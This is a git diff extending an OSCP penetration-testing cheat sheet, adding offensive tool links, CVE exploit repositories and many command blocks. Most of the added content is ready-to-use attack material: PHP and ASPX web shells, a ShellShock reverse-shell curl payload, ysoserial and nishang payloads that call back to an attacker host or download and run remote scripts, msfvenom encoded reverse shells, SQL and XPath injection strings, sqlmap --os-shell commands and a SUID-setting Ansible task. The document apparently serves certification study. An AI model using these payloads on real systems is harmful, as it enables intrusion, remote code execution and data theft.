@@ -7,6 +7,7 @@ Commands, Payloads and Resources for the Offensive Security Certified Profession
 | Tool | URL |
 | --- | --- |
 | Impacket | https://github.com/SecureAuthCorp/impacket |
+| Swaks | https://github.com/jetmore/swaks |
 
 ### Information Gathering
 | Tool | URL |
@@ -22,27 +23,51 @@ Commands, Payloads and Resources for the Offensive Security Certified Profession
 | Nmap | https://github.com/nmap/nmap |
 | Nuclei | https://github.com/projectdiscovery/nuclei |
 | WPScan | https://github.com/wpscanteam/wpscan |
+| BloodHound | https://github.com/BloodHoundAD/BloodHound |
 
 ### Web Application Analysis
 | Tool | URL |
 | --- | --- |
+| PayloadsAllTheThings | https://github.com/swisskyrepo/PayloadsAllTheThings |
+| ysoserial | https://github.com/frohoff/ysoserial |
+| httpx | https://github.com/projectdiscovery/httpx |
+| Hakrawler | https://github.com/hakluke/hakrawler |
+| Gobuster | https://github.com/OJ/gobuster |
+| ffuf | https://github.com/ffuf/ffuf |
+| Wfuzz | https://github.com/xmendez/wfuzz |
 
 ### Database Assessment
 | Tool | URL |
 | --- | --- |
+| sqlmap | https://github.com/sqlmapproject/sqlmap |
 
 ### Password Attacks
 | Tool | URL |
 | --- | --- |
 | CrackMapExec | https://github.com/byt3bl33d3r/CrackMapExec |
+| SprayingToolkit | https://github.com/byt3bl33d3r/SprayingToolkit |
+| RsaCtfTool | https://github.com/Ganapati/RsaCtfTool |
+| Kerbrute | https://github.com/ropnop/kerbrute |
+| Default Credentials Cheat Sheet | https://github.com/ihebski/DefaultCreds-cheat-sheet |
 
 ### Reverse Engineering
 | Tool | URL |
 | --- | --- |
+| dnSpy | https://github.com/dnSpy/dnSpy |
+| AvalonialLSpy | https://github.com/icsharpcode/AvaloniaILSpy |
+| ghidra | https://github.com/NationalSecurityAgency/ghidra |
+| pwndbg | https://github.com/pwndbg/pwndbg |
+| cutter | https://github.com/rizinorg/cutter |
+| Radare2 | https://github.com/radareorg/radare2 |
+| GEF | https://github.com/hugsy/gef |
+| peda | https://github.com/longld/peda |
+| JD-GUI | https://github.com/java-decompiler/jd-gui |
 
 ### Exploitation Tools
 | Tool | URL |
 | --- | --- |
+| lsassy | https://github.com/Hackndo/lsassy |
+| Evil-WinRM | https://github.com/Hackplayers/evil-winrm |
 | Metasploit | https://github.com/rapid7/metasploit-framework |
 
 ### Post Exploitation
@@ -55,32 +80,68 @@ Commands, Payloads and Resources for the Offensive Security Certified Profession
 | WESNG | https://github.com/bitsadmin/wesng
 | Sherlock | https://github.com/sherlock-project/sherlock |
 | nishang | https://github.com/samratashok/nishang |
+| Shikata Ga Nai | https://github.com/EgeBalci/sgn |
 | Empire | https://github.com/BC-SECURITY/Empire |
 | LaZagne | https://github.com/AlessandroZ/LaZagne |
+| GTFOBins | https://gtfobins.github.io/ |
+| LOLBAS | https://lolbas-project.github.io/ |
+| powercat | https://github.com/besimorhino/powercat |
+| PowerView | https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1 |
+| mimikatz | https://github.com/gentilkiwi/mimikatz |
+| pypykatz | https://github.com/skelsec/pypykatz |
+| Rubeus | https://github.com/GhostPack/Rubeus |
+| unicorn | https://github.com/trustedsec/unicorn |
 | printspoofer | https://github.com/dievus/printspoofer |
+| GenericPotato | https://github.com/micahvandeusen/GenericPotato |
+| Juicy Potato | https://github.com/ohpe/juicy-potato |
 | Rotten Potato | https://github.com/breenmachine/RottenPotatoNG |
 | JAWS | https://github.com/411Hall/JAWS |
+| Active Directory Kill Chain Attack & Defense | https://github.com/infosecn1nja/AD-Attack-Defense |
 | Windows-privesc-check | https://github.com/pentestmonkey/windows-privesc-check |
 | Windows Privilege Escalation | https://github.com/frizb/Windows-Privilege-Escalation |
 | Windows Privilege Escalation Fundamentals | https://www.fuzzysecurity.com/tutorials/16.html |
 | Windows Exploits | https://github.com/SecWiki/windows-kernel-exploits |
 | Pre-compiled Windows Exploits | https://github.com/abatchy17/WindowsExploits |
+| static-binaries | https://github.com/andrew-d/static-binaries |
+| SeBackupPrivilege | https://github.com/giuliano108/SeBackupPrivilege |
 
-### Forensics
-| Tool | URL |
+### CVEs
+| CVE | URL |
 | --- | --- |
+| CVE-2017-0199 | https://github.com/bhdresh/CVE-2017-0199 |
+| CVE-2018-16509 | https://github.com/farisv/PIL-RCE-Ghostscript-CVE-2018-16509 |
+| CVE-2019-18634 | https://github.com/saleemrashid/sudo-cve-2019-18634 |
+| CVE-2019-20933 | https://github.com/LorenzoTullini/InfluxDB-Exploit-CVE-2019-20933 |
+| CVE-2019-5736 | https://github.com/Frichetten/CVE-2019-5736-PoC |
+| dirty_sock | https://github.com/initstring/dirty_sock |
+| CVE-2020-1472 | https://github.com/SecuraBV/CVE-2020-1472 |
+| CVE-2020-1472 | https://github.com/risksense/zerologon |
+| CVE-2020-8165 | https://github.com/masahiro331/CVE-2020-8165 |
+| CVE-2021-1675 | https://github.com/calebstewart/CVE-2021-1675 |
+| CVE-2021-26084 | https://github.com/Phuong39/CVE-2021-26085 |
+| CVE-2021-3129 | https://github.com/nth347/CVE-2021-3129_exploit |
+| CVE-2021-3490 | https://github.com/rapid7/metasploit-framework/pull/15567 |
+| CVE-2021-40444 | https://xret2pwn.github.io/CVE-2021-40444-Analysis-and-Exploit/ |
+| CVE-2020-1751, CVE-2021-41773,42013 | https://github.com/MrCl0wnLab/SimplesApachePathTraversal |
+| CVE-2021-36934 | https://github.com/GossiTheDog/HiveNightmare |
+| SystemNightmare | https://github.com/GossiTheDog/SystemNightmare |
+| PetitPotam | https://github.com/topotam/PetitPotam |
 
 ### Exploiting
 | Tool | URL |
 | --- | --- |
 | PwnTools | https://github.com/Gallopsled/pwntools |
+| checksec | https://github.com/slimm609/checksec.sh |
 | mona | https://github.com/corelan/mona |
+| Ropper | https://github.com/sashs/Ropper |
 | Buffer Overflow | https://github.com/gh0x0st/Buffer_Overflow |
 
 ### Wordlists
 | Tool | URL |
 | --- | --- |
 | SecLists | https://github.com/danielmiessler/SecLists |
+| CeWL | https://github.com/digininja/cewl |
+| CUPP | https://github.com/Mebus/cupp |
 
 ### Social Media Resources
 | Name | URL |
@@ -93,7 +154,6 @@ Commands, Payloads and Resources for the Offensive Security Certified Profession
 | Rana Khalil | https://rana-khalil.gitbook.io/hack-the-box-oscp-preparation/ |
 
 ## Commands
-
 ### Basics
 #### CentOS
 ```c
@@ -107,6 +167,12 @@ certutil -urlcache -split -f "http://<local_ip>/<file>" <file>
 ```c
 $ ./chisel server -p 9002 -reverse -v
 $ ./chisel client <remote_ip>:9002 R:9003:127.0.0.1:8888
+```
+#### gcc
+```c
+gcc (--static) -m32 -Wl,--hash-style=both exploit.c -o exploit
+i686-w64-mingw32-gcc -o main32.exe main.c
+x86_64-w64-mingw32-gcc -o main64.exe main.c
 ```
 #### Netcat
 ```c
@@ -131,6 +197,18 @@ sudo pyhton3 -m http.server 80
 ```c
 xfreerdp /v:<remote_ip> /u:<user> /p:<password> +clipboard
 rdesktop <remote_ip>
+```
+#### SSH
+```c
+ssh user@<remote_ip> -oKexAlgorithms=+diffie-hellman-group1-sha1
+
+ssh -R 8080:<local_ip>:80 <remote_ip>
+ssh -L 8000:127.0.0.1:8000 <user>@<remote_ip>
+ssh -N -L 1234:127.0.0.1:1234 <user>@<remote_ip>
+
+ssh -L 80:<local_ip>:80 <remote_ip>
+ssh -L 127.0.0.1:80:<local_ip>:80 <remote_ip>
+ssh -L 80:localhost:80 <remote_ip>
 ```
 #### tmux
 ```c
@@ -182,6 +260,15 @@ dig {a|txt|ns|mx} <domain>
 dig {a|txt|ns|mx} <domain> @ns1.<domain>
 dig axfr @<remote_ip> <domain>           # zone transfer - needs tcp DNS - port 53
 ```
+#### ldapsearch
+```c
+ldapsearch -x -w <password>
+ldapsearch -x -h <remote_ip> -s base namingcontexts
+ldapsearch -x -b "dc=<target_domain>,dc=local" "*" -h <remote_ip> | awk '/dn: / {print $2}'
+ldapsearch -x -D "cn=admin,dc=<target_domain>,dc=local" -s sub "cn=*" -h <remote_ip> | awk '/uid: /{print $2}' | nl
+ldapsearch -D "cn=admin,dc=acme,dc=com" "(objectClass=*)" -w ldapadmin -h ldap.acme.com
+ldapsearch -x -h <remote_ip> -D "<user>"  -b "dc=<target_domain>,dc=local" "(ms-MCS-AdmPwd=*)" ms-MCS-AdmPwd
+```
 #### SMB / NetBIOS
 ```c
 nbtscan <remote_ip>
@@ -189,6 +276,14 @@ enum4linux -a <remote_ip>
 ```
 
 ### Vulnerability Analysis
+#### finger
+```c
+./finger-user-enum.pl -U /usr/share/seclists/Usernames/Names/names.txt -t <remote_ip>
+```
+#### Heartbleed
+```c
+sslyze --heartbleed <remote_ip>
+```
 #### Nmap:
 ```c
 sudo nmap -A -T4 -p- -sS -sV -oN initial --script discovery <remote_ip>    # discovery scan
@@ -628,8 +723,98 @@ wfuzz -c -w /usr/share/wordlists/secLists/Discovery/DNS/subdomains-top1million-1
 
 wfuzz -w /usr/share/wordlists/seclists/Fuzzing/4-digits-0000-9999.txt --hw 31 http://10.13.37.11/backups/backup_2021052315FUZZ.zip
 ```
+#### ysoserial
+```c
+java -jar ysoserial-master-SNAPSHOT.jar
+java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections1 'nc <local_ip> <local_port> -e /bin/sh' | base64 -w 0
+java -jar ysoserial.jar Groovy1 calc.exe > groovypayload.bin
+java -jar ysoserial-master-6eca5bc740-1.jar CommonsCollections4 "$jex" > /tmp/$filename.session
+```
+
+### Database Analysis
+#### Basic Commands:
+```c
+show databases;
+use <db>;
+show tables;
+SELECT * FROM *;
+mysql -u <user> -h <host> -p
+```
+#### SQLInjection
+```c
+' or '1'='1
+admin' or '1'='1
+-'
+' '
+'&'
+'^'
+'*'
+' or ''-'
+' or '' '
+' or ''&'
+' or ''^'
+' or ''*'
+"-"
+" "
+"&"
+"^"
+"*"
+" or ""-"
+" or "" "
+" or ""&"
+" or ""^"
+" or ""*"
+or true--
+" or true--
+' or true--
+") or true--
+') or true--
+' or 'x'='x
+') or ('x')=('x
+')) or (('x'))=(('x
+" or "x"="x
+") or ("x")=("x
+")) or (("x"))=(("x
+```
+#### sqlmap
+```c
+--batch         # don't ask any questions
+--current-db    # dumps database
+
+sqlmap --list-tampers
+
+sqlmap -r <file>.reg -p id
+sqlmap -r <file>.reg -p id --dump
+sqlmap -r <file>.reg --level 5 --risk 3 --threads 10
+sqlmap -r <file>.reg --level 5 --risk 3 --tables
+sqlmap -r <file>.reg --level 5 --risk 3 --tables users --dump --threads 10
+sqlmap -r <file>.reg -p id --passwords
+sqlmap -r <file>.reg -p id --read-file+/etc/passwd
+sqlmap -R <file>.reg -p id --os-cmd=whoami
+sqlmap -u 'http://<remote_ip>/dashboard.php?search=a' --cookie="PHPSESSID=c35v0sipg7q8cnpiqpeqj42hhq"
+sqlmap -u 'http://<remote_ip>/dashboard.php?search=a' --cookie="PHPSESSID=c35v0sipg7q8cnpiqpeqj42hhq" --os-shell
+```
+#### sqsh
+```c
+sqsh -S <remote_ip> -U <user>
+```
+#### SQL Truncation Attack
+```c
+'admin@<FQDN>' = 'admin@<FQDN>++++++++++++++++++++++++++++++++++++++htb'
+```
+#### xpath Injection
+```c
+test' or 1=1 or 'a'='a
+test' or 1=2 or 'a'='a
+'or substring(Password,1,1)='p' or'    # checking letter "p" on the beginning of the password
+'or substring(Password,2,1)='p' or'    # checking letter "p" on the second position of the password
+```
 
 ### Password Attacks
+#### frack
+```c
+fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt <file>.zip
+```
 #### Hydra
 ```c
 export HYDRA_PROXY=connect://127.0.0.1:8080
@@ -653,6 +838,13 @@ john --show <file>
 ```c
 /usr/share/webshells
 <?php echo shell_exe(($_GET['cmd']); ?>
+
+<?php echo "test";?>
+<?php system($_GET['cmd']);?>
+
+<?php file_put_contents($_GET['upload'], file_get_contents("http://<local_ip>:<local_port>/" . $_GET['upload']); ?>
+
+<?php if (isset($_GET['upload'])) {file_put_contents($_GET['upload'], file_get_contents("http://<local_ip>:<local_port>/" . $_GET['upload'])); }; if (isset($_GET['cmd'])) { system($_GET['cmd']); };?>
 ```
 
 ### Post Exploitation
@@ -704,6 +896,10 @@ whoami /all
 net users
 net users <user>
 ```
+#### Evil-WinRM
+```c
+sudo ruby /usr/local/bin/evil-winrm -i <remote_ip> -u <user> -p <password>
+```
 #### find Commands
 ```c
 find ./ -type f -exec grep --color=always -i -I 'password' {} \;
@@ -745,6 +941,18 @@ msf6 exploit(multi/handler) > run
 ```c
 laZagne.exe all
 ```
+#### nishang
+```c
+cd path/to/nishang/Shells/
+cp Invoke-PowerShellTcp.ps1 Invoke-PowerShellTcp.ps1
+
+tail -3 Invoke-PowerShellTcp.ps1
+}
+
+Invoke-PowerShellTcp -Reverse -IPAddress <local_ip> -Port <local_port>
+
+powershell "IEX(New-Object Net.Webclient).downloadString('http://<local_ip>:<local_port>/Invoke-PowerShellTcp.ps1')"
+```
 #### Powershell & Powercat
 ```c
 Set-ExecutionPolicy Unrestricted
@@ -764,6 +972,16 @@ powershell -c "Invoke-Webrequest -Uri \"http://<local_ip>:<local_port>/shell.exe
 <remote_ip>/node/3?cmd=powershell -c IEX(New-object System.net.webclient).DownloadString('http://<local_ip>:<local:port>/Sherlock.ps1');Find-AllVulns
 
 echo "IEX (New-object System.net.webclient).DownloadString('http://<local_ip>:<local_port>/shell.ps1')" | powershell -noprofile -
+```
+#### ShellShock
+```c
+curl -H 'Cookie: () { :;}; /bin/bash -i >& /dev/tcp/<local_ip>/<local_port> 0>&1' http://<remote_ip>/cgi-bin/user.sh
+```
+#### Shikata Ga Nai
+```c
+msfvenom -p windows/shell_reverse_tcp LHOST=<local_ip> LPORT=<local_port> -f c -a x86 --platform windows -b "\x00\x0a\x0d" -e x86/shikata_ga_nai
+
+msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=<local_ip> LPORT=<local_port> -b "\x00" -e x86/shikata_ga_nai -f exe -o /tmp/shell.exe
 ```
 #### Windows Tasks & Services
 ```c
@@ -808,7 +1026,81 @@ python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SO
 ruby -rsocket -e'f=TCPSocket.open("<local_ip>",<local_port>).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
 ```
 
+### Templates
+#### ASPX Web Shell
+```c
+<?xml version="1.0" encoding="UTF-8"?>
+<configuration>
+   <system.webServer>
+      <handlers accessPolicy="Read, Script, Write">
+         <add name="web_config" path="*.config" verb="*" modules="IsapiModule" scriptProcessor="%windir%\system32\inetsrv\asp.dll" resourceType="Unspecified" requireAccess="Write" preCondition="bitness64" />
+      </handlers>
+      <security>
+         <requestFiltering>
+            <fileExtensions>
+               <remove fileExtension=".config" />
+            </fileExtensions>
+            <hiddenSegments>
+               <remove segment="web.config" />
+            </hiddenSegments>
+         </requestFiltering>
+      </security>
+   </system.webServer>
+</configuration>
+<!-- ASP code comes here! It should not include HTML comment closing tag and double dashes!
+<%
+Set s = CreateObject("WScript.Shell")
+Set cmd = s.Exec("cmd /c powershell -c IEX (New-Object Net.Webclient).downloadstring('http://10.10.14.10/shellyjelly.ps1')")
+o = cmd.StdOut.Readall()
+Response.write(o)
+%>
+-->
+```
+#### Bad YAML
+```c
+- hosts: localhost
+  tasks:
+    - name: badyml
+      command: chmod +s /bin/bash
+```
+#### Exploit Skeleton Python Script
+```c
+#!/usr/bin/python
 
+import socket,sys
 
+address = '127.0.0.1'
+port = 9999
+buffer = #TBD
 
+try:
+	print '[+] Sending buffer'
+	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+	s.connect((address,port))
+	s.recv(1024)
+	s.send(buffer + '\r\n')
+except:
+ 	print '[!] Unable to connect to the application.'
+ 	sys.exit(0)
+finally:
+	s.close()
+```
+#### JSON POST Request
+```c
+POST /<path> HTTP/1.1
+Host: <remote_ip>
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Content-Type: application/json
+Content-Length: 95
+Connection: close
 
+{
+  "auth":{
+    "name":"<user>",
+    "password":"<password>"
+  },
+  "filename":"<file>"
+}
+```
